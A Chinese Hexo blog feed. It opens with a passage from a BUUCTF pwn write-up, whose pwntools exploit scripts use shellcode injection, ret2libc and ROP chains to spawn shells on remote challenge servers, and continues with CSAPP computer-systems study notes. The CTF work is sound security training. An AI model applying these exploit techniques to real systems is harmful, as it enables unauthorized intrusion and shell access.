class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29487</span>)<br><br>shellcode_addr=<span class="hljs-number">0x601080</span><br>shellcode=asm(shellcraft.sh())<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span>+p64(shellcode_addr)<br><br>io.recvuntil(<span class="hljs-string">b&#x27;name\n&#x27;</span>)<br>io.sendline(shellcode)<br>io.recvuntil(<span class="hljs-string">b&#x27;me?\n&#x27;</span>)<br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="17-others-shellcode"><a href="#17-others-shellcode" class="headerlink" title="17.others_shellcode"></a>17.others_shellcode</h1><p>直接nc过去就通了。。。</p><h1 id="18-ciscn-2019-en-2"><a href="#18-ciscn-2019-en-2" class="headerlink" title="18.ciscn_2019_en_2"></a>18.ciscn_2019_en_2</h1><p>同第8题，给payload再稍微解释一下</p><h2 id="1-payload"><a href="#1-payload" class="headerlink" title="(1)payload"></a>(1)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span>*<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<span class="hljs-comment">#基本设置，防止出现版本错误，养成好习惯</span><br><br>io=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">26149</span>)<br><span class="hljs-comment">#io=process(&#x27;./ciscn_2019_en_2&#x27;)</span><br>elf=ELF(<span class="hljs-string">&#x27;./ciscn_2019_en_2&#x27;</span>)<br><br>pop_rdi=<span class="hljs-number">0x400c83</span><br>pop_ret=<span class="hljs-number">0x4006b9</span><br>main_addr=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>io.recvuntil(<span class="hljs-string">b&#x27;choice!\n&#x27;</span>)<br>io.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">b&#x27;encrypted\n&#x27;</span>)<br><br>payload=<span class="hljs-string">b&#x27;\x00&#x27;</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x57</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)<br><span class="hljs-comment">#前面是\x00截断，rid传参，got是参数，plt是函数，main是返回地址（这是64位调用函数的方式）</span><br>io.sendline(payload)<br>io.recvuntil(<span class="hljs-string">b&#x27;Ciphertext\n&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>puts_addr=u64(io.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\0&#x27;</span>))<br><span class="hljs-comment">#这个是接收一行，去除末尾换行符，补齐到8位，直接用u64(io.recv(8))不行接到的数据是错的</span><br>libc=LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>,puts_addr)<br>libcbase=puts_addr-libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>system=libcbase+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>str_bin_sh=libcbase+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br>payload=<span class="hljs-string">b&#x27;\x00&#x27;</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x57</span>+p64(pop_ret)+p64(pop_rdi)+p64(str_bin_sh)+p64(system)<br><span class="hljs-comment">#ubuntu18，栈对齐，所以用ret来凑数</span><br>io.recvuntil(<span class="hljs-string">b&#x27;choice!\n&#x27;</span>)<br>io.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;encrypted\n&#x27;</span>)<br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="19-not-the-same-3dsctf-2016"><a href="#19-not-the-same-3dsctf-2016" class="headerlink" title="19.not_the_same_3dsctf_2016"></a>19.not_the_same_3dsctf_2016</h1><h2 id="1-分析-6"><a href="#1-分析-6" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230911180955318.png" alt="image-20230911180955318"></p><p>进入IDA发现，函数非常多，基本是静态编译，所以一些C语言的库函数可以拿来用了</p><p>main</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230911181152285.png" alt="image-20230911181152285"></p><p>get_secret</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230911181228380.png" alt="image-20230911181228380"></p><p>发现程序将flag存在fl4g中，我们可以利用write函数（&#x3D;&#x3D;这里需要积累常用C语言库函数&#x3D;&#x3D;）从这里读取flag</p><p>那么思路基本明确，先利用get_secret函数让程序将flag存在fl4g中，然后返回main函数，再利用write函数读取fl4g的内容，也就是flag。</p><h2 id="2-payload-6"><a href="#2-payload-6" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<span class="hljs-comment">#养成好习惯</span><br><br>io=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27292</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./19&#x27;</span>)<br>get_secret=<span class="hljs-number">0x80489A0</span><br>flag_addr=<span class="hljs-number">0x80ECA2D</span><br>write_addr=elf.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br><span class="hljs-comment">#write_addr=0x806e270用pwndbg打断点，或者IDA查write函数也能找到，上面是偷懒的方法，但是可能出错</span><br>main_addr=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br>payload1 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x2d</span>+p32(get_secret)+p32(main_addr)<br><br>io.sendline(payload1)<span class="hljs-comment">#第一次发送payload将flag存在fl4g中</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x2d</span>+p32(write_addr)+p32(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">1</span>)+p32(flag_addr)+p32(<span class="hljs-number">45</span>)<br><span class="hljs-comment">#p32(0)是write函数的返回（执行）地址，p32(1)+p32(flag_addr)+p32(45)是返回地址带的三个参数</span><br>io.sendline(payload2)<br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="20-ciscn-2019-ne-5"><a href="#20-ciscn-2019-ne-5" class="headerlink" title="20.ciscn_2019_ne_5"></a>20.ciscn_2019_ne_5</h1><h2 id="1-分析-7"><a href="#1-分析-7" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230911182523250.png" alt="image-20230911182523250"></p><p>main</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230911182628348.png" alt="image-20230911182628348"></p><p>GetFlag函数</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230911182645815.png" alt="image-20230911182645815"></p><p>strcpy函数复制src到dest时，只要src够长，就能让dest溢出</p><p>Print函数</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230911201216248.png" alt="image-20230911201216248"></p><p>给了system函数</p><p>AddLog函数</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230911201250970.png" alt="image-20230911201250970"></p><p>那么我们可以先让V4的值为1，在src写入payload，再设置V4的值为4，使得dest溢出</p><p>需要注意的是，不仅&#x2F;bin&#x2F;sh字符串可以拿权限，sh有时也可以，类似的还有$0</p><p>sh字符串查找</p><blockquote><p>ROPgadget –binary 20 –string ‘sh’</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230911214532678.png" alt="image-20230911214532678"></p><h2 id="2-payload-7"><a href="#2-payload-7" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-comment">#io=process(&#x27;./20&#x27;)</span><br>io=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27905</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./20&#x27;</span>)<br><br>sh_addr=<span class="hljs-number">0x080482ea</span><br>system_addr=<span class="hljs-number">0x80484D0</span><br><br>io.recvuntil(<span class="hljs-string">b&#x27;password:&#x27;</span>)<br>io.sendline(<span class="hljs-string">b&#x27;administrator&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">b&#x27;0.Exit\n:&#x27;</span>)<br>io.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x4c</span>+p32(system_addr)+<span class="hljs-string">b&#x27;1234&#x27;</span>+p32(sh_addr)<br><br>io.recvuntil(<span class="hljs-string">b&quot;Please input new log info:&quot;</span>)<br>io.sendline(payload)<br>io.recvuntil(<span class="hljs-string">b&#x27;0.Exit\n:&#x27;</span>)<br>io.sendline(<span class="hljs-string">b&#x27;4&#x27;</span>)<br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="3-总结-3"><a href="#3-总结-3" class="headerlink" title="(3)总结"></a>(3)总结</h2><p>system函数可以在IDA中这么找</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230911204845274.png" alt="image-20230911204845274"></p><p>双击跟进</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230911204924672.png" alt="image-20230911204924672"></p><p>也可以在pwndbg中打断点找</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230911213413737.png" alt="image-20230911213413737"></p><p>还能直接在终端找</p><blockquote><p>objdump -d -j .plt .&#x2F;program’s_name | grep system</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230911213744432.png" alt="image-20230911213744432"></p><p>偏移地址可以这么找</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230911214127860.png" alt="image-20230911214127860"></p>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
      <category>pwn练习记录</category>
      
      <category>BUUCTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP-1-计算机系统漫谈</title>
    <link href="/2023/09/04/CSAPP/CSAPP-1-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%BC%AB%E8%B0%88/"/>
    <url>/2023/09/04/CSAPP/CSAPP-1-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%BC%AB%E8%B0%88/</url>
    
    <content type="html"><![CDATA[<h1 id="CSAPP第一章总览"><a href="#CSAPP第一章总览" class="headerlink" title="CSAPP第一章总览"></a>CSAPP第一章总览</h1><h2 id="1-1信息就是位-上下文"><a href="#1-1信息就是位-上下文" class="headerlink" title="1.1信息就是位+上下文"></a>1.1信息就是位+上下文</h2><ul><li><p>源程序实际上就是一个由0和1组成的位(又称为比特)序列，8个位被组织成一组，称为字节。</p></li><li><p>使用ASCII标准来表示文本字符，这种方式实际上就是用一个唯一的单字节大小的整数值。来表示每个字</p></li><li><p>只由ASCII字符构成的文件称为文本文件，所有其他文件都称为二进制文件。</p></li><li><p>系统中所有的信息——包括磁盘文件、内存中的程序、内存中存放的用户数据以及网络上传送的数据，都是由一串比特表示的。区分不同数据对象的唯一方法是我们读到这些数据对象时的上下文。比如，在不同的上下文中，一个同样的字节序列可能表示一个整数、浮点数、宇符串或者机器指令。</p></li></ul><h2 id="1-2程序被翻译成不同格式"><a href="#1-2程序被翻译成不同格式" class="headerlink" title="1.2程序被翻译成不同格式"></a>1.2程序被翻译成不同格式</h2><ul><li><p>C语句都必须被其他程序转化为一系列的低级机器语言指令。然后这些指令按照一种称为可执行目标程序的格式打好包，并以二进制磁盘文件的形式存放起来。目标程序也称为可执行目标文件。</p><p>  <img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404181955743.png"></p><p>  <img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404181955744.png"></p></li></ul><h2 id="1-3编译系统"><a href="#1-3编译系统" class="headerlink" title="1.3编译系统"></a>1.3编译系统</h2><ul><li><p>优化程序性能</p><blockquote><p>需要了解机器代码以及编译器将C语句转化为代码的方式</p></blockquote></li><li><p>理解链接时出现的错误</p><blockquote><p>最令人困扰的程序往往都与链接器操作有关，有些错误直到运行才会出现</p></blockquote></li><li><p>避免安全漏洞，降低攻击威胁</p><blockquote><p>缓冲区溢出错误为主要原因</p><p>需要限制数据接收的数量和格式理解数据和控制信息存储在程序栈上的方式</p></blockquote></li></ul><h2 id="1-4处理器读取并解释指令"><a href="#1-4处理器读取并解释指令" class="headerlink" title="1.4处理器读取并解释指令"></a>1.4处理器读取并解释指令</h2><p>例：</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404181955745.png"></p><h3 id="1-4-1硬件组成"><a href="#1-4-1硬件组成" class="headerlink" title="1.4.1硬件组成"></a>1.4.1硬件组成</h3><ul><li><p>总线</p></li><li><p>I&#x2F;O设备</p><blockquote><p>作为用户输入的键盘和鼠标，作为用户输出的显示器，以及用于长期存储数据和程序的磁盘驱动器(简单地说就是磁盘</p><p>每个I&#x2F;O设备都通过一个控制器或适配器与I&#x2F;O总线相连</p></blockquote></li><li><p>主存</p><blockquote><p>主存是一个临时存储设备，在处理器执行程序时，用来存放程序和程序处理的数据。从物理上来说，主存是由一组动态随机存取存储器(DRAM)芯片组成的。从逻辑上来说，存储器是一个线性的字节数组，每个字节都有其唯一的地址(数组索引),&#x3D;&#x3D;地址从零开始。&#x3D;&#x3D;</p></blockquote></li><li><p>处理器</p><blockquote><p>中央处理单元(CPU),简称处理器，是解释(或执行)存储在主存中指令的引擎。处理器的核心是一个大小为一个字的存储设备(或寄存器),称为程序计数器(PC)。在任何时刻,PC都指向主存中的某条机器语言指令(即含有该条指令的地址)。(~AX)</p><p>&#x3D;&#x3D;处理器从程序计数器指向的内存处读取指令，解释指令中的位，执行该指令指示的简单操作，然后更新PC,使其指向下一条指令，而这条指令并不一定和在内存中刚刚执行的指令相邻。&#x3D;&#x3D;</p><p><strong>寄存器</strong></p><p>寄存器文件是一个小的存储设备，由一些单个字长的寄存器组成，每个寄存器都有唯一的名字。</p><ul><li>加载：从主存复制一个字节或者一个字到寄存器，以覆盖寄存器原来的内容。</li><li>存储：从寄存器复制一个字节或者一个字到主存的某个位置，以覆盖这个位置上原来的内容。</li><li>操作：把两个寄存器的内容复制到ALU,ALU对这两个字做算术运算，并将结果存放到一个寄存器中，以覆盖该寄存器中原来的内容。</li><li>跳转：从指令本身中抽取一个字，并将这个字复制到程序计数器(PC)中，以覆盖PC中原来的值。</li></ul><p>现代处理器使用了非常复杂的机制来加速程序的执行。因此，我们将处理器的指令集架构和处理器的微体系结构区分开来：</p><p>指令集架构描述的是每条机器代码指令的效果；而微体系结构描述的是处理器实际上是如何实现的。</p></blockquote></li></ul><h3 id="1-4-2具体例子"><a href="#1-4-2具体例子" class="headerlink" title="1.4.2具体例子"></a>1.4.2具体例子</h3><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404181955746.png"></p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404181955747.png"></p><h2 id="1-5高速缓存"><a href="#1-5高速缓存" class="headerlink" title="1.5高速缓存"></a>1.5高速缓存</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404181955748.png"></p><p>高速缓存存储器(cache memory,简称为cache或高速缓存),作为暂时的集结区域，存放处理器近期可能会需要的信息。</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404181955749.png"></p><p>Ll和L2高速缓存是用一种叫做静态随机访问存储器(SRAM)的硬件技术实现的。</p><p>利用高速缓存的局部性原理，即程序具有访问局部区域里的数据和代码的趋势。通过让高速缓存里存放可能经常访问的数据，大部分的内存操作都能在快速的高速缓存中完成。</p><h2 id="1-6存储设备层次结构"><a href="#1-6存储设备层次结构" class="headerlink" title="1.6存储设备层次结构"></a>1.6存储设备层次结构</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404181955750.png"></p><p><strong>存储器层次结构主要思想是上一层的存储器作为低一层存储器的高速缓存。</strong></p><p>寄存器文件是L1的高速缓存，L1是L2的高速缓存……最后的是主存的高速缓存，主存是磁盘的高速缓存……</p><h2 id="1-7操作系统"><a href="#1-7操作系统" class="headerlink" title="1.7操作系统"></a>1.7操作系统</h2><p>我们可以把操作系统看成是应用程序和硬件之间插入的一层软件，所有应用程序对硬件的操作尝试都必须通过操作系统。</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404181955751.png"></p><p>操作系统有两个基本功能：</p><p>(1)防止硬件被失控的应用程序滥用；</p><p>(2)向应用程序提供简单一致的机制来控制复杂而又通常大不相同的低级硬件设备。</p><p>操作系统通过几个基本的抽象概念(进程、虚拟内存和文件)来实现这两个功能。</p><p>文件是对I&#x2F;O设备的抽象表示，虚拟内存是对主存和磁盘I&#x2F;O设备的抽象表示，进程则是对处理器、主存和I&#x2F;O设备的抽象表示。</p><blockquote><p>标准Unix规范”的独立标准化工作已经与Posix一起创建了统一的Unix系统标准。这些标准化工作的结果是Unix版本之间的差异已经基本消失。</p></blockquote><h3 id="1-7-1进程"><a href="#1-7-1进程" class="headerlink" title="1.7.1进程"></a>1.7.1进程</h3><blockquote><p>​像hello这样的程序在现代系统上运行时，操作系统会提供一种假象，就好像系统上只有这个程序在运行。程序看上去是独占地使用处理器、主存和I&#x2F;O设备。处理器看上去就像在不间断地一条接一条地执行程序中的指令，即该程序的代码和数据是系统内存中唯一的对象。这些假象是通过进程的概念来实现的，进程是计算机科学中最重要和最成功的概念之一。</p></blockquote><p>进程是操作系统对一个正在运行的程序的一种抽象。在一个系统上可以同时运行多个进程，而每个进程都好像在独占地使用硬件。</p><p>并发运行，则是说一个进程的指令和另一个进程的指令是交错执行的。</p><p>在大多数系统中，需要运行的进程数是多于可以运行它们的CPU个数的。传统系统在一个时刻只能执行一个程序，而先进的多核处理器同时能够执行多个程序。无论是在单核还是多核系统中，一个CPU看上去都像是在并发地执行多个进程，这是通过处理器在进程间切换来实现的。</p><p>操作系统实现这种交错执行的机制称为&#x3D;&#x3D;上下文切换。&#x3D;&#x3D;</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404181955752.png"></p><h3 id="1-7-2线程"><a href="#1-7-2线程" class="headerlink" title="1.7.2线程"></a>1.7.2线程</h3><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404181955753.png"></p><h3 id="1-7-3虚拟内存"><a href="#1-7-3虚拟内存" class="headerlink" title="1.7.3虚拟内存"></a>1.7.3虚拟内存</h3><p>虚拟内存是一个抽象概念，它为每个进程提供了一个假象，即每个进程都在独占地使用主存。每个进程看到的内存都是一致的，称为虚拟地址空间。</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404181955754.png"></p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404181955755.png"></p><h3 id="1-7-4文件"><a href="#1-7-4文件" class="headerlink" title="1.7.4文件"></a>1.7.4文件</h3><p>文件就是字节序列。所有计算机系统中的交互设备都可以看作文件。</p><p>这个概念向应用程序提供了一个统一的视图来看待系统中各种I&#x2F;O设备。</p><h2 id="1-8网络"><a href="#1-8网络" class="headerlink" title="1.8网络"></a>1.8网络</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404181955756.png"></p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404181955757.png"></p><h2 id="1-9小结"><a href="#1-9小结" class="headerlink" title="1.9小结"></a>1.9小结</h2><p><strong>系统不仅仅只是硬件，系统是软硬件互相交织的集合体，它们共同协作来运行应用程序。</strong></p><p>Amdahl定律：短板效应</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404181955758.png"></p><h1 id="课后习题要点"><a href="#课后习题要点" class="headerlink" title="课后习题要点"></a>课后习题要点</h1><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>以上是对现代计算机系统的综述和总结，以及对本书主要内容的梳理。</p><p>下面是复习时主要关注的内容：</p>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
      <category>pwn前置知识</category>
      
      <category>CSAPP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CSAPP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP(6)-存储器层次结构</title>
    <link href="/2023/08/29/CSAPP/CSAPP-6-%E5%AD%98%E5%82%A8%E5%99%A8%E5%B1%82%E6%AC%A1%E7%BB%93%E6%9E%84/"/>
    <url>/2023/08/29/CSAPP/CSAPP-6-%E5%AD%98%E5%82%A8%E5%99%A8%E5%B1%82%E6%AC%A1%E7%BB%93%E6%9E%84/</url>
    
    <content type="html"><![CDATA[<h1 id="CSAPP第六章总览"><a href="#CSAPP第六章总览" class="headerlink" title="CSAPP第六章总览"></a>CSAPP第六章总览</h1><h1 id="视频学习与思考"><a href="#视频学习与思考" class="headerlink" title="视频学习与思考"></a>视频学习与思考</h1><h1 id="课后习题要点"><a href="#课后习题要点" class="headerlink" title="课后习题要点"></a>课后习题要点</h1><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
      <category>pwn前置知识</category>
      
      <category>CSAPP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CSAPP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP(5)-程序性能优化</title>
    <link href="/2023/08/29/CSAPP/CSAPP-5-%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/"/>
    <url>/2023/08/29/CSAPP/CSAPP-5-%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="CSAPP第五章总览"><a href="#CSAPP第五章总览" class="headerlink" title="CSAPP第五章总览"></a>CSAPP第五章总览</h1><h1 id="视频学习与思考"><a href="#视频学习与思考" class="headerlink" title="视频学习与思考"></a>视频学习与思考</h1><h1 id="课后习题要点"><a href="#课后习题要点" class="headerlink" title="课后习题要点"></a>课后习题要点</h1><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
      <category>pwn前置知识</category>
      
      <category>CSAPP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CSAPP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP(4)-处理器体系结构</title>
    <link href="/2023/08/29/CSAPP/CSAPP-4-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"/>
    <url>/2023/08/29/CSAPP/CSAPP-4-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/</url>
    
    <content type="html"><![CDATA[<h1 id="CSAPP第四章总览"><a href="#CSAPP第四章总览" class="headerlink" title="CSAPP第四章总览"></a>CSAPP第四章总览</h1><h1 id="视频学习与思考"><a href="#视频学习与思考" class="headerlink" title="视频学习与思考"></a>视频学习与思考</h1><h1 id="课后习题要点"><a href="#课后习题要点" class="headerlink" title="课后习题要点"></a>课后习题要点</h1><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
      <category>pwn前置知识</category>
      
      <category>CSAPP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CSAPP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP(3)-程序的机器级表示</title>
    <link href="/2023/08/29/CSAPP/CSAPP-3-%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA/"/>
    <url>/2023/08/29/CSAPP/CSAPP-3-%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="CSAPP第三章总览"><a href="#CSAPP第三章总览" class="headerlink" title="CSAPP第三章总览"></a>CSAPP第三章总览</h1><h1 id="视频学习与思考"><a href="#视频学习与思考" class="headerlink" title="视频学习与思考"></a>视频学习与思考</h1><h1 id="课后习题要点"><a href="#课后习题要点" class="headerlink" title="课后习题要点"></a>课后习题要点</h1><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
      <category>pwn前置知识</category>
      
      <category>CSAPP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CSAPP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP(2)-信息的表示与处理</title>
    <link href="/2023/08/29/CSAPP/CSAPP-2-%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E4%B8%8E%E5%A4%84%E7%90%86/"/>
    <url>/2023/08/29/CSAPP/CSAPP-2-%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E4%B8%8E%E5%A4%84%E7%90%86/</url>
    
